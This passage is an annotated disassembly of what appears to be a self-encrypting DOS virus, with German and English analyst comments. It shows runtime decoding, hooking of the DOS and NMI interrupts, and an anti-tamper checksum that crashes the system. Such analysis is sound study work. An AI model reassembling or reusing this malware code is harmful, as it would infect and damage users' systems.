                        ;     L3092 CC  L309B CC  L30A4 CC  L30AD CC  L30B6 CC  L30BF CC  L30C8 CC
                        ;     L30D1 CC  L30DA CC
L3047:  XOR CS:[SI],BX          ;3047 2E 31 1C
    NOP                 ;304A 90
    RET_NEAR                ;304B C3

                        ;L304C    L28C5 CC  L386A CC  L3897 CC
;   obiges xor decodiert 3047-304a, now 26 patches si = 210a + 2810 -> 491a
L304C:  PUSH    BX              ;304C 53
    ADD SI,15               ;304D 83 C6 15
    MOV BX,OFFSET L157D         ;3050 BB 7D 15
    CALL    L3047               ;3053 E8 F1 FF
    ADD SI,2                ;3056 83 C6 02
    MOV BX,OFFSET L758B         ;3059 BB 8B 75
    CALL    L3047               ;305C E8 E8 FF
    ADD SI,2                ;305F 83 C6 02
    MOV BX,81               ;3062 BB 81 00
    CALL    L3047               ;3065 E8 DF FF
    ADD SI,8                ;3068 83 C6 08
    MOV BX,OFFSET L0A08         ;306B BB 08 0A
    CALL    L3047               ;306E E8 D6 FF
    ADD SI,2                ;3071 83 C6 02
    MOV BX,OFFSET L302F ;'0/'       ;3074 BB 2F 30
    CALL    L3047               ;3077 E8 CD FF
    ADD SI,2                ;307A 83 C6 02
    MOV BX,OFFSET L02A5         ;307D BB A5 02
    CALL    L3047               ;3080 E8 C4 FF
    ADD SI,5E   ;'^'            ;3083 83 C6 5E
    MOV BX,OFFSET L157D         ;3086 BB 7D 15
    CALL    L3047               ;3089 E8 BB FF
    ADD SI,5                ;308C 83 C6 05
    MOV BX,OFFSET LA09F         ;308F BB 9F A0
    CALL    L3047               ;3092 E8 B2 FF
    ADD SI,0A               ;3095 83 C6 0A
    MOV BX,0A7              ;3098 BB A7 00
    CALL    L3047               ;309B E8 A9 FF
    ADD SI,0C               ;309E 83 C6 0C
    MOV BX,OFFSET L872D         ;30A1 BB 2D 87
    CALL    L3047               ;30A4 E8 A0 FF
    ADD SI,2                ;30A7 83 C6 02
    MOV BX,OFFSET L7829 ;'x)'       ;30AA BB 29 78
    CALL    L3047               ;30AD E8 97 FF
    ADD SI,2                ;30B0 83 C6 02
    MOV BX,OFFSET L4229 ;'B)'       ;30B3 BB 29 42
    CALL    L3047               ;30B6 E8 8E FF
    ADD SI,2                ;30B9 83 C6 02
    MOV BX,OFFSET L1AC0         ;30BC BB C0 1A
    CALL    L3047               ;30BF E8 85 FF
    ADD SI,6C   ;'l'            ;30C2 83 C6 6C
    MOV BX,OFFSET L1114         ;30C5 BB 14 11
    CALL    L3047               ;30C8 E8 7C FF
    ADD SI,0F               ;30CB 83 C6 0F
    MOV BX,0                ;30CE BB 00 00
    CALL    L3047               ;30D1 E8 73 FF
    ADD SI,0BH              ;30D4 83 C6 0B
    MOV BX,OFFSET L02E3         ;30D7 BB E3 02
    CALL    L3047               ;30DA E8 6A FF
    POP BX              ;30DD 5B
    RET_NEAR                ;30DE C3

    CALL    L3243           ;decode_code    ;30DF E8 61 01
    DW  L732C               ;30E2 2C 73
    PUSH    CS              ;30E4 0E
    POP ES              ;30E5 07
    MOV DI,OFFSET L24B5         ;30E6 BF B5 24
                        ;L30E8    L350F DR
L30E8   EQU $-1
    MOV CX,25   ;'%'            ;30E9 B9 25 00
    MOV SI,DX               ;30EC 89 D6
    REPZ    MOVSB               ;30EE F3 A4
    PUSH    DS              ;30F0 1E
    PUSH    DX              ;30F1 52
    PUSH    CS              ;30F2 0E
    POP DS              ;30F3 1F
    MOV AH,0F               ;30F4 B4 0F
    MOV DX,OFFSET L24B5         ;30F6 BA B5 24
    CALL    WORD PTR CS:L2566       ;30F9 2E FF 16 66 25
    MOV AH,10               ;30FE B4 10
    CALL    WORD PTR CS:L2566       ;3100 2E FF 16 66 25
    TEST    BYTE PTR L24CC,80       ;3105 F6 06 CC 24 80
    POP SI              ;310A 5E
    POP DS              ;310B 1F
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;310C E8 7A 18
    DB  2DH             ;310F 2D
    JZ  L3182               ;3110 74 70
    LES BL,DWORD PTR CS:L24C5       ;3112 2E C4 1E C5 24
    CALL    L3243           ;decode_code    ;3117 E8 29 01
    DW  L0027               ;311A 27 00
    MOV AX,ES               ;311C 8C C0
    SUB BX,OFFSET L2400         ;311E 81 EB 00 24
    SBB AX,0                ;3122 1D 00 00
    XOR DX,DX               ;3125 33 D2
    MOV CX,CS:L24C3         ;3127 2E 8B 0E C3 24
    DEC CX              ;312C 49
    ADD BX,CX               ;312D 01 CB
    ADC AX,0                ;312F 15 00 00
    INC CX              ;3132 41
    DIV CX              ;3133 F7 F1
    MOV [SI+23],AX          ;3135 89 44 23
    XCHG    DX,AX               ;3138 92
    XCHG    BX,AX               ;3139 93
    DIV CX              ;313A F7 F1
    MOV [SI+21],AX          ;313C 89 44 21
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;313F E8 47 18
    DB  28              ;3142 28
    JMP L2EA3               ;3143 E9 5D FD

                        ;L3146    L28CD CC  L2B10 CC
;   verbiege Int 02 (NMI) auf iret, save auf [2594]:[2592]
L3146:  CALL    L3243           ;decode_code    ;3146 E8 FA 00
    DW  LF335               ;3149 35 F3
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;314B E8 EE FA
    IN  AL,21               ;314E E4 21
    OR  AL,2                ;3150 0C 02
    OUT 21,AL               ;3152 E6 21
    MOV AL,2                ;3154 B0 02
    CALL    L2CB9           ;get Int (AL) into es:bx    
                        ;3156 E8 60 FB
    MOV AX,CS               ;3159 8C C8
    MOV CX,ES               ;315B 8C C1
    CMP AX,CX               ;315D 3B C1
    JZ  L3179               ;315F 74 18
    MOV CS:L2594,ES         ;3161 2E 8C 06 94 25
    MOV CS:L2592,BX         ;3166 2E 89 1E 92 25
    PUSH    CS              ;316B 0E
    POP DS              ;316C 1F
    CALL    L3170               ;316D E8 00 00
                        ;L3170    L316D CC
L3170:  POP DX              ;3170 5A
    ADD DX,11               ;3171 83 C2 11
    MOV AL,2                ;3174 B0 02
    CALL    L2C6C           ;set Int (AL) to ds:dx  ;3176 E8 F3 FA
                        ;L3179    L315F CJ
L3179:  CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;3179 E8 3E FA
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;317C E8 0A 18
    DB  36              ;317F 36
    RET_NEAR                ;3180 C3

    IRET                    ;3181 CF

                        ;L3182    L3110 CJ
L3182:  JMP L2B8B               ;3182 E9 06 FA

    DB  0E8             ;3185 E8
                        ;L3186    L29DD CC  L2BAE CC  L4A4E CC
;   restauriere Int 02 (NMI) auf [2594]:[2592] (Original)
L3186:  CALL    L3243           ;decode_code    ;3186 E8 BA 00
    DW  L3E1A               ;3189 1A 3E
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;318B E8 AE FA
    IN  AL,21               ;318E E4 21
    AND AL,0FDH             ;3190 24 FD
    OUT 21,AL               ;3192 E6 21
    LDS DX,DWORD PTR CS:L2592       ;3194 2E C5 16 92 25
    MOV AL,2                ;3199 B0 02
    CALL    L2C6C           ;set Int (AL) to ds:dx  ;319B E8 CE FA
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;319E E8 19 FA
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;31A1 E8 E5 17
    DB  1BH             ;31A4 1B
    RET_NEAR                ;31A5 C3

    CALL    L3A29           ;get current PSP nach [24a3]    
                        ;31A6 E8 80 08
    CALL    L39C3               ;31A9 E8 17 08
    JB  L31F1               ;31AC 72 43
    CMP BYTE PTR CS:L24A2,0     ;31AE 2E 80 3E A2 24 00
    JZ  L31F1               ;31B4 74 3B
    CALL    L43B1               ;31B6 E8 F8 11
    CMP BX,-1               ;31B9 83 FB FF
    JZ  L31F1               ;31BC 74 33
    CALL    L3243           ;decode_code    ;31BE E8 82 00
    DW  LE824               ;31C1 24 E8
    DEC BYTE PTR CS:L24A2       ;31C3 2E FE 0E A2 24
    PUSH    CS              ;31C8 0E
    POP ES              ;31C9 07
    MOV CX,14               ;31CA B9 14 00
    MOV DI,OFFSET L2452 ;'$R'       ;31CD BF 52 24
    XOR AX,AX               ;31D0 33 C0
    REPNZ   SCASW               ;31D2 F2 AF
    MOV AX,CS:L24A3         ;31D4 2E A1 A3 24
    MOV ES:[DI-2],AX            ;31D8 26 89 45 FE
    MOV ES:[DI+26],BX           ;31DC 26 89 5D 26
    MOV [BP-4],BX           ;31E0 89 5E FC
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;31E3 E8 A3 17
    DB  25              ;31E6 25
                        ;L31E7    L3224 CJ  L46B6 CJ
L31E7:  AND BYTE PTR CS:L24B3,0FE       ;31E7 2E 80 26 B3 24 FE
                        ;L31E9    L289D DI
L31E9   EQU $-4
    JMP L2EA3               ;31ED E9 B3 FC

    DB  0E8             ;31F0 E8
                        ;L31F1    L31AC CJ  L31B4 CJ  L31BC CJ
L31F1:  JMP L2B8B               ;31F1 E9 97 F9

    CALL    L3243           ;decode_code    ;31F4 E8 4C 00
    DW  LE413               ;31F7 13 E4
    PUSH    CS              ;31F9 0E
    POP ES              ;31FA 07
    CALL    L3A29           ;get current PSP nach [24a3]    
                        ;31FB E8 2B 08
    MOV CX,14               ;31FE B9 14 00
    MOV AX,CS:L24A3         ;3201 2E A1 A3 24
    MOV DI,OFFSET L2452 ;'$R'       ;3205 BF 52 24
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3208 E8 7E 17
    DB  14              ;320B 14
                        ;L320C    L3214 CJ
L320C:  REPNZ   SCASW               ;320C F2 AF
    JNZ L3227               ;320E 75 17
    CMP BX,ES:[DI+26]           ;3210 26 3B 5D 26
    JNZ L320C               ;3214 75 F6
    MOV WORD PTR ES:[DI-2],0        ;3216 26 C7 45 FE 00 00
    CALL    L3642               ;321C E8 23 04
    INC BYTE PTR CS:L24A2       ;321F 2E FE 06 A2 24
    JMP SHORT   L31E7           ;3224 EB C1

    DB  0BBH                ;3226 BB
                        ;L3227    L320E CJ
L3227:  JMP L2B8B               ;3227 E9 61 F9

    DB  3DH             ;322A 3D
                        ;L322B    L2D24 CC  L2F6D CC  L47A5 CC
;   get DTA-adress nach ds:bx
L322B:  CALL    L3243           ;decode_code    ;322B E8 15 00
    DW  L600F               ;322E 0F 60
    MOV AH,2F   ;'/'            ;3230 B4 2F
    PUSH    ES              ;3232 06
    CALL    WORD PTR CS:L2566       ;3233 2E FF 16 66 25
    PUSH    ES              ;3238 06
    POP DS              ;3239 1F
    POP ES              ;323A 07
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;323B E8 4B 17
    DB  10              ;323E 10
    RET_NEAR                ;323F C3

                        ;L3240    L3246 CJ
L3240:  JMP L3555               ;3240 E9 12 03

                        ;L3243    L28C8 CC  L2905 CC  L2947 CC  L298D CC  L29C1 CC  L2A01 CC  L2A2E CC
                        ;     L2AFB CC  L2B23 CC  L2B95 CC  L2BBA CC  L2BD7 CC  L2C0F CC  L2C3C CC
                        ;     L2C58 CC  L2C6C CC  L2C8B CC  L2CB9 CC  L2D04 CC  L2D1C CC  L2D6A CC
                        ;     L2D7F CC  L2DA9 CC  L2EA9 CC  L2EDA CC  L2EF0 CC  L2F55 CC  L2F7A CC
                        ;     L2FF6 CC  L30DF CC  L3117 CC  L3146 CC  L3186 CC  L31BE CC  L31F4 CC
                        ;     L322B CC  L3264 CC  L32DA CC  L330D CC  L3350 CC  L3428 CC  L345F CC
                        ;     L34AF CC  L354D CC  L356C CC  L358E CC  L35FA CC  L3642 CC  L367E CC
                        ;     L369E CC  L36FF CC  L3732 CC  L3766 CC  L3791 CC  L37FF CC  L389A CC
                        ;     L38CD CC  L393F CC  L397A CC  L399A CC  L39C3 CC  L39EC CC  L3A29 CC
                        ;     L3A41 CC  L436C CC  L4392 CC  L43B1 CC  L43E4 CC  L4418 CC  L443D CC
                        ;     L444D CC  L4460 CC  L44CE CC  L4523 CC  L4554 CC  L4573 CC  L45B2 CC
                        ;     L45D0 CC  L4679 CC  L46B9 CC  L46DF CC  L471C CC  L4780 CC  L47B7 CC
                        ;     L47D0 CC  L482E CC  L488D CC  L48CD CC  L48F3 CC  L4A83 CC  L4AC7 CC
                        ;     L4AEF CC
;   decode_code
L3243:  JMP L491B               ;3243 E9 D5 16

    JZ  L3240               ;3246 74 F8
    SUB AX,OFFSET L12EF         ;3248 2D EF 12
    DEC SI              ;324B 4E
    INC BH              ;324C FE C7
    JMP L2FEA               ;324E E9 99 FD

                        ;L3251    L2D62 CJ  L2F0B CJ  L2FCB CJ
L3251:  MOV DX,BP               ;3251 8B D5
    MOV BP,SP               ;3253 89 E5
    MOV BX,OFFSET LC353         ;3255 BB 53 C3
    PUSH    BX              ;3258 53
    CALL    L341A           ;ret adr = 325c + 278h -> 34d4 -> bx , bei [bp] : push bx,ret nach 34d4 
                        ;3259 E8 BE 01
    DB  0BBH                ;325C BB
    OR  AL,AL               ;325D 0A C0
    JZ  L3264               ;325F 74 03
    JMP L34FC               ;3261 E9 98 02

                        ;L3264    L325F CJ
L3264:  CALL    L3243           ;decode_code    ;3264 E8 DC FF
    DW  L3E4D               ;3267 4D 3E
    PUSH    DS              ;3269 1E
    PUSH    DX              ;326A 52
    MOV CS:L2426,ES         ;326B 2E 8C 06 26 24
    MOV CS:L2424,BX         ;3270 2E 89 1E 24 24
    LDS SI,DWORD PTR CS:L2424       ;3275 2E C5 36 24 24
    MOV CX,0E               ;327A B9 0E 00
    MOV DI,OFFSET L24F1         ;327D BF F1 24
    PUSH    CS              ;3280 0E
    POP ES              ;3281 07
    REPZ    MOVSB               ;3282 F3 A4
    POP SI              ;3284 5E
    POP DS              ;3285 1F
    MOV CX,50   ;'P'            ;3286 B9 50 00
    MOV DI,OFFSET L2507         ;3289 BF 07 25
    REPZ    MOVSB               ;328C F3 A4
    MOV BX,0FFFF            ;328E BB FF FF
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;3291 E8 26 F9
    POP BP              ;3294 5D
    POP CS:L24E6            ;3295 2E 8F 06 E6 24
    POP CS:L24E8            ;329A 2E 8F 06 E8 24
    POP CS:L24B3            ;329F 2E 8F 06 B3 24
    PUSH    CS              ;32A4 0E
    MOV AX,OFFSET L4B01         ;32A5 B8 01 4B
    POP ES              ;32A8 07
    PUSHF                   ;32A9 9C
    MOV BX,OFFSET L24F1         ;32AA BB F1 24
    CALL    DWORD PTR   CS:L2435    ;32AD 2E FF 1E 35 24
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;32B2 E8 D4 16
    DB  4E              ;32B5 4E
    JNB L32DA               ;32B6 73 22
    DW  L832E,LB30E,L0124       ;32B8 2E 83 0E B3 24 01
    PUSH    CS:L24B3            ;32BE 2E FF 36 B3 24
    PUSH    CS:L24E8            ;32C3 2E FF 36 E8 24
    PUSH    CS:L24E6            ;32C8 2E FF 36 E6 24
    PUSH    BP              ;32CD 55
    LES BL,DWORD PTR CS:L2424       ;32CE 2E C4 1E 24 24
    MOV BP,SP               ;32D3 89 E5
    JMP L2B95               ;32D5 E9 BD F8

    DW  L0489               ;32D8 89 04
                        ;L32DA    L32B6 CJ
L32DA:  CALL    L3243           ;decode_code    ;32DA E8 66 FF
    DW  L2924               ;32DD 24 29
    CALL    L3A29           ;get current PSP nach [24a3]    
                        ;32DF E8 47 07
    PUSH    CS              ;32E2 0E
    POP ES              ;32E3 07
    MOV CX,14               ;32E4 B9 14 00
    MOV DI,OFFSET L2452 ;'$R'       ;32E7 BF 52 24
                        ;L32EA    L32FD CJ
L32EA:  MOV AX,CS:L24A3         ;32EA 2E A1 A3 24
    REPNZ   SCASW               ;32EE F2 AF
    JNZ L32FF               ;32F0 75 0D
    MOV WORD PTR ES:[DI-2],0        ;32F2 26 C7 45 FE 00 00
    INC BYTE PTR CS:L24A2       ;32F8 2E FE 06 A2 24
    JMP SHORT   L32EA           ;32FD EB EB

                        ;L32FF    L32F0 CJ
L32FF:  CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;32FF E8 87 16
    DB  25              ;3302 25
    LDS SI,DWORD PTR CS:L2503       ;3303 2E C5 36 03 25
    CMP SI,1                ;3308 83 FE 01
    JNZ L334D               ;330B 75 40
    CALL    L3243           ;decode_code    ;330D E8 33 FF
    DW  LE137               ;3310 37 E1
    MOV DX,DS:1A            ;3312 8B 16 1A 00
    ADD DX,10               ;3316 83 C2 10
    MOV AH,51   ;'Q'            ;3319 B4 51
    CALL    WORD PTR CS:L2566       ;331B 2E FF 16 66 25
    ADD DX,BX               ;3320 03 D3
    MOV CS:L2505,DX         ;3322 2E 89 16 05 25
    PUSH    DS:18               ;3327 FF 36 18 00
    POP CS:L2503            ;332B 2E 8F 06 03 25
    ADD BX,DS:12            ;3330 03 1E 12 00
    ADD BX,10               ;3334 83 C3 10
    MOV CS:L2501,BX         ;3337 2E 89 1E 01 25
    PUSH    DS:14               ;333C FF 36 14 00
    POP CS:L24FF            ;3340 2E 8F 06 FF 24
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3345 E8 41 16
    DB  38              ;3348 38
    JMP L345F               ;3349 E9 13 01

    DB  9               ;334C 09
                        ;L334D    L330B CJ
L334D:  JMP L3428               ;334D E9 D8 00

                        ;L3350    L47D5 CC
;   Code compare
L3350:  CALL    L3243           ;decode_code    ;3350 E8 F0 FE
    DW  L38C4               ;3353 C4 38
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;3355 E8 E4 F8
    JMP L3362           ;Compare Bytes  ;3358 E9 07 00

                        ;L335B    L335F CJ  L336A CC  L3373 CC  L337C CC  L3385 CC  L338E CC  L3397 CC
                        ;     L33A0 CC  L33A9 CC  L33B2 CC  L33BB CC  L33C4 CC  L33CD CC  L33D6 CC
                        ;     L33DF CC  L33E8 CC  L33F1 CC
L335B:  XOR AL,CS:[BX]          ;335B 2E 32 07
    INC BX              ;335E 43
    LOOP    L335B               ;335F E2 FA
    RET_NEAR                ;3361 C3

                        ;L3362    L3358 CJ
;   Compare Bytes
L3362:  XOR AL,AL               ;3362 32 C0
    MOV BX,21   ;'!'            ;3364 BB 21 00
    MOV CX,7A   ;'z'            ;3367 B9 7A 00
    CALL    L335B               ;336A E8 EE FF
    MOV BX,OFFSET L0173         ;336D BB 73 01
    MOV CX,0A               ;3370 B9 0A 00
    CALL    L335B               ;3373 E8 E5 FF
    MOV BX,OFFSET L0253         ;3376 BB 53 02
    MOV CX,1C               ;3379 B9 1C 00
    CALL    L335B               ;337C E8 DC FF
    MOV BX,OFFSET L0550         ;337F BB 50 05
    MOV CX,0A               ;3382 B9 0A 00
    CALL    L335B               ;3385 E8 D3 FF
    MOV BX,OFFSET L0705         ;3388 BB 05 07
    MOV CX,40   ;'@'            ;338B B9 40 00
    CALL    L335B               ;338E E8 CA FF
    MOV BX,OFFSET L0790         ;3391 BB 90 07
    MOV CX,56   ;'V'            ;3394 B9 56 00
    CALL    L335B               ;3397 E8 C1 FF
    MOV BX,OFFSET L0A30         ;339A BB 30 0A
    MOV CX,24   ;'$'            ;339D B9 24 00
    CALL    L335B               ;33A0 E8 B8 FF
    MOV BX,OFFSET L0C0A         ;33A3 BB 0A 0C
    MOV CX,0E               ;33A6 B9 0E 00
    CALL    L335B               ;33A9 E8 AF FF
    MOV BX,OFFSET L0CC4         ;33AC BB C4 0C
    MOV CX,3C   ;'<'            ;33AF B9 3C 00
    CALL    L335B               ;33B2 E8 A6 FF
    MOV BX,OFFSET L105A         ;33B5 BB 5A 10
    MOV CX,2DH  ;'-'            ;33B8 B9 2D 00
    CALL    L335B               ;33BB E8 9D FF
    MOV BX,OFFSET L1106         ;33BE BB 06 11
    MOV CX,29   ;')'            ;33C1 B9 29 00
    CALL    L335B               ;33C4 E8 94 FF
    MOV BX,OFFSET L210A         ;33C7 BB 0A 21
    MOV CX,67   ;'g'            ;33CA B9 67 00
    CALL    L335B               ;33CD E8 8B FF
    MOV BX,OFFSET L2173 ;'!s'       ;33D0 BB 73 21
    MOV CX,0D8              ;33D3 B9 D8 00
    CALL    L335B               ;33D6 E8 82 FF
    MOV BX,OFFSET L236C ;'#l'       ;33D9 BB 6C 23
    MOV CX,39   ;'9'            ;33DC B9 39 00
    CALL    L335B               ;33DF E8 79 FF
    MOV BX,OFFSET L1D7D         ;33E2 BB 7D 1D
    MOV CX,25   ;'%'            ;33E5 B9 25 00
    CALL    L335B               ;33E8 E8 70 FF
    MOV BX,OFFSET L1C7C         ;33EB BB 7C 1C
    MOV CX,42   ;'B'            ;33EE B9 42 00
    CALL    L335B               ;33F1 E8 67 FF
    CMP AL,0E0              ;33F4 3C E0
    JZ  L3412           ;jmp hierher    ;33F6 74 1A
    MOV WORD PTR CS:L2598,OFFSET LF4F4  ;33F8 2E C7 06 98 25 F4 F4
    MOV BX,OFFSET L2598         ;33FF BB 98 25
    PUSHF                   ;3402 9C
    PUSH    CS              ;3403 0E
    PUSH    BX              ;3404 53
    XOR AX,AX               ;3405 33 C0
    MOV DS,AX               ;3407 8E D8
    MOV WORD PTR DS:6,0FFFF     ;3409 C7 06 06 00 FF FF
    CALL    L4AEF               ;340F E8 DD 16
                        ;L3412    L33F6 CJ
;   jmp hierher
L3412:  CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;3412 E8 A5 F7
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3415 E8 71 15
    DB  0C5             ;3418 C5
    RET_NEAR                ;3419 C3

                        ;L341A    L3259 CC
;   ret adr = 325c + 278h -> 34d4 -> bx , bei [bp] : push bx,ret nach 34d4
L341A:  POP BX              ;341A 5B
    ADD BX,OFFSET L0278         ;341B 81 C3 78 02
    PUSH    DX              ;341F 52
    SUB BP,2                ;3420 83 ED 02
    JMP BP              ;3423 FF E5

    JMP L3503               ;3425 E9 DB 00

                        ;L3428    L334D CJ
L3428:  CALL    L3243           ;decode_code    ;3428 E8 18 FE
    DW  L8418               ;342B 18 84
    MOV AX,[SI]             ;342D 8B 04
    ADD AX,[SI+2]           ;342F 03 44 02
    PUSH    BX              ;3432 53
    MOV BX,[SI+4]           ;3433 8B 5C 04
    XOR BX,OFFSET L5348 ;'SH'       ;3436 81 F3 48 53
    XOR BX,OFFSET L4649 ;'FI'       ;343A 81 F3 49 46
    ADD AX,BX               ;343E 01 D8
    POP BX              ;3440 5B
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3441 E8 45 15
    DB  19              ;3444 19
    JZ  L34AF               ;3445 74 68
    PUSH    CS              ;3447 0E
    POP DS              ;3448 1F
    MOV DX,OFFSET L2507         ;3449 BA 07 25
    CALL    L39C3               ;344C E8 74 05
    CALL    L43B1               ;344F E8 5F 0F
    INC BYTE PTR CS:L24EF       ;3452 2E FE 06 EF 24
                        ;L3456    L40BD DI
L3456   EQU $-1
    CALL    L3642               ;3457 E8 E8 01
                        ;L345A    L34B4 CJ
L345A:  DEC BYTE PTR CS:L24EF       ;345A 2E FE 0E EF 24
                        ;L345F    L3349 CJ
L345F:  CALL    L3243           ;decode_code    ;345F E8 E1 FD
    DW  L3E46               ;3462 46 3E
    MOV AH,51   ;'Q'            ;3464 B4 51
    CALL    WORD PTR CS:L2566       ;3466 2E FF 16 66 25
    CALL    L2C8B           ;Register sichern ( CS: Stack ) 
                        ;346B E8 1D F8
    CALL    L2C0F           ;Int 21 patchen auf jmp cs:2256 [244c]:[244e] / repatchen   
                        ;346E E8 9E F7
    CALL    L2BD7           ;Register restaurieren ( CS : Stack )   
                        ;3471 E8 63 F7
    MOV DS,BX               ;3474 8E DB
    MOV ES,BX               ;3476 8E C3
    PUSH    CS:L24B3            ;3478 2E FF 36 B3 24
    PUSH    CS:L24E8            ;347D 2E FF 36 E8 24
                        ;L347F    L34C1 CJ
L347F   EQU $-3
    PUSH    CS:L24E6            ;3482 2E FF 36 E6 24
                        ;L3486    L34C8 CJ
L3486   EQU $-1
    POP DS:0A               ;3487 8F 06 0A 00
    POP DS:0C               ;348B 8F 06 0C 00
    PUSH    DS              ;348F 1E
                        ;L3490    L2FEA DI
L3490:  MOV AL,22   ;'"'            ;3490 B0 22
    LDS DX,DWORD PTR DS:0A      ;3492 C5 16 0A 00
    CALL    L2C6C           ;set Int (AL) to ds:dx  ;3496 E8 D3 F7
    POP DS              ;3499 1F
    POPF                    ;349A 9D
    POP AX              ;349B 58
    MOV SP,CS:L24FF         ;349C 2E 8B 26 FF 24
    MOV SS,CS:L2501         ;34A1 2E 8E 16 01 25
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;34A6 E8 E0 14
    DB  47              ;34A9 47
    JMP DWORD PTR   CS:L2503    ;34AA 2E FF 2E 03 25

                        ;L34AF    L2C05 DI  L3445 CJ
L34AF:  CALL    L3243           ;decode_code    ;34AF E8 91 FD
    PUSH    DS              ;34B2 1E
    CLC                 ;34B3 F8
    JNB L345A               ;34B4 73 A4
    STC                 ;34B6 F9
    JNB L3531               ;34B7 73 78
                        ;L34B9    L34BB CJ
L34B9:  MOV BL,24   ;'$'            ;34B9 B3 24
    JNO L34B9               ;34BB 71 FC
    JNB L3537               ;34BD 73 78
    MOV CH,24   ;'$'            ;34BF B5 24
    JNO L347F               ;34C1 71 BC
    CLI                 ;34C3 FA
    JNB L353E               ;34C4 73 78
    MOV BH,24   ;'$'            ;34C6 B7 24
    JNO L3486               ;34C8 71 BC
    CLD                 ;34CA FC
    ADC DL,BH               ;34CB 10 FA
    JMP L74E0               ;34CD E9 10 40

    IN  AL,DX               ;34D0 EC
    OUT 0EBH,AX             ;34D1 E7 EB
    DB  8BH             ;34D3 8B
    MOV BYTE PTR CS:[SI+L1210],0E9  ;34D4 2E C6 84 10 12 E9
    POP BP              ;34DA 5D
    MOV CX,4                ;34DB B9 04 00
    MOV BX,DS               ;34DE 8C DB
    OR  BX,BP               ;34E0 09 EB
    MOV DS,BX               ;34E2 8E DB
                        ;L34E4    L34E6 CJ
L34E4:  SHL BX,1                ;34E4 D1 E3
    LOOP    L34E4               ;34E6 E2 FC
    MOV AX,CX               ;34E8 89 C8
    MOV CX,1C               ;34EA B9 1C 00
                        ;L34ED    L34F0 CJ
L34ED:  ADD AH,[BX]             ;34ED 02 27
    INC BX              ;34EF 43
    LOOP    L34ED               ;34F0 E2 FB
    PUSH    AX              ;34F2 50
    MOV CX,[BX]             ;34F3 8B 0F
    PUSH    CS              ;34F5 0E
    POP AX              ;34F6 58
    SHR BH,1                ;34F7 D0 EF
    JMP L3919               ;34F9 E9 1D 04

                        ;L34FC    L3261 CJ
L34FC:  CMP AL,1                ;34FC 3C 01
    JZ  L3510               ;34FE 74 10
                        ;L34FF    L3522 CJ
L34FF   EQU $-1
    JMP L2B8B               ;3500 E9 88 F6

                        ;L3503    L3425 CJ  L3509 CJ
L3503:  ADD BX,CX               ;3503 01 CB
    CMP BX,OFFSET L2834 ;'(4'       ;3505 81 FB 34 28
    JB  L3503               ;3509 72 F8
    XOR CX,OFFSET L2121 ;'!!'       ;350B 81 F1 21 21
    MOV AX,L30E8            ;350F A1 E8 30
                        ;L3510    L34FE CJ
L3510   EQU $-2
    STD                 ;3512 FD
    SUB BH,BH               ;3513 28 FF
    SAR WORD PTR [SI-0F],1      ;3515 D1 7C F1
    DEC SP              ;3518 4C
    ESC 1F,SI               ;3519 DB FE
    DB  0D1,73  ??          ;351B D1 73
    STC                 ;351D F9
    ESC 0BH,BX              ;351E D9 DB
    DB  0D1,76  ??          ;3520 D1 76
    LOOPZ   L34FF               ;3522 E1 DB
    ESC 1A,[BX]             ;3524 DB 17
    DB  6DH ??          ;3526 6D
    OR  CX,DX               ;3527 09 D1
    ADD CL,CH               ;3529 00 E9
    CWD                 ;352B 99
    ESC 12,[BX]             ;352C DA 17
    REPZ    OR  CL,DL               ;352E F3 08 D1
                        ;L3531    L34B7 CJ
L3531:  CMP SP,CX               ;3531 3B E1
    ESC 1BH,BX              ;3533 DB DB
    ESC 0F,[BP+SI]          ;3535 D9 3A
                        ;L3537    L34BD CJ
L3537:  MOV CH,CH               ;3537 88 ED
    POP SS              ;3539 17
    MOV DL,0EBH             ;353A B2 EB
    DB  0D6 ??          ;353C D6
    JNB L3542               ;353D 73 03
                        ;L353E    L34C4 CJ
L353E   EQU $-1
    JMP L35E0               ;353F E9 9E 00

                        ;L3542    L353D CJ
L3542:  AND BYTE PTR CS:L24B3,0FE       ;3542 2E 80 26 B3 24 FE
    CMP SI,1                ;3548 83 FE 01
    JZ  L358E               ;354B 74 41
    CALL    L3243           ;decode_code    ;354D E8 F3 FC
    SBB DL,BL               ;3550 18 DA
    PUSH    CX              ;3552 51
    ESC 33,CX   ;'3'            ;3553 DE D9
                        ;L3555    L3240 CJ
L3555:  SAHF                    ;3555 9E
    ESC 1,[BX+DI+OFFSET L8651]      ;3556 D8 89 51 86
    ESC 33,[BP+DI+29]           ;355A DE 5B 29
    XCHG    DX,AX               ;355D 92
    MOV [BP+DI+29],BX           ;355E 89 5B 29
    XCHG    BX,AX               ;3561 93
    PUSHF                   ;3562 9C
    ESC 18,[BP+SI]          ;3563 DB 02
    XOR WORD PTR [BP+SI],OFFSET LCEFA   ;3565 81 32 FA CE
    RET_NEAR                ;3569 C3

    JNZ L35C3               ;356A 75 57
    CALL    L3243           ;decode_code    ;356C E8 D4 FC
    SBB BP,SI               ;356F 1B EE
    DB  65  ??          ;3571 65
    MOV DL,0EF              ;3572 B2 EF
